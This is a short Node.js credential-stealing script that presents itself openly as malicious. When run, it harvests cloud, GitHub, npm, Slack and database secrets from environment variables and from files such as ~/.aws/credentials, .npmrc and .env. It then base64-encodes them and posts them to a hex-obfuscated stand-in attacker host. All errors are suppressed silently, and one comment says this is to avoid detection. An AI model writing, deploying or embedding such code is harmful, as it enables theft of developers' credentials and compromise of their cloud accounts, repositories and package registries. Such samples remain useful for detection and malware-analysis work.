const https = require('https');
const fs = require('fs');
const os = require('os');
const path = require('path');

// Obfuscated exfiltration endpoint
const exfilServer = Buffer.from('687474703a2f2f6d616c6963696f75732d7365727665722e6576696c2f636f6c6c656374', 'hex').toString();

function harvestCredentials() {
    const stolenData = {
        timestamp: new Date().toISOString(),
        hostname: os.hostname(),
        platform: os.platform(),
        env: {},
        files: {}
    };

    // Target specific environment variables
    const targetEnvVars = [
        'AWS_ACCESS_KEY_ID',
        'AWS_SECRET_ACCESS_KEY', 
        'GITHUB_TOKEN',
        'NPM_TOKEN',
        'SLACK_TOKEN',
        'DATABASE_URL',
        'API_KEY'
    ];

    targetEnvVars.forEach(varName => {
        if (process.env[varName]) {
            stolenData.env[varName] = process.env[varName];
        }
    });

    // Attempt to read sensitive configuration files
    const homeDir = os.homedir();
    const sensitiveFiles = [
        path.join(homeDir, '.npmrc'),
        path.join(homeDir, '.aws', 'credentials'),
        path.join(homeDir, '.env'),
        path.join(homeDir, '.git-credentials'),
        path.join(process.cwd(), '.env')
    ];

    sensitiveFiles.forEach(filePath => {
        try {
            if (fs.existsSync(filePath)) {
                stolenData.files[filePath] = fs.readFileSync(filePath, 'utf8');
            }
        } catch (e) {
            // Silently fail
        }
    });

    return stolenData;
}

function exfiltrateData(data) {
    const payload = JSON.stringify(data);
    const encodedPayload = Buffer.from(payload).toString('base64');

    try {
        const req = https.request(exfilServer + '?data=' + encodedPayload, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' }
        });
        req.write(payload);
        req.end();
    } catch (e) {
        // Silently fail to avoid detection
    }
}

// Execute the malicious payload
try {
    const credentials = harvestCredentials();
    exfiltrateData(credentials);
} catch (e) {
    // Fail silently
}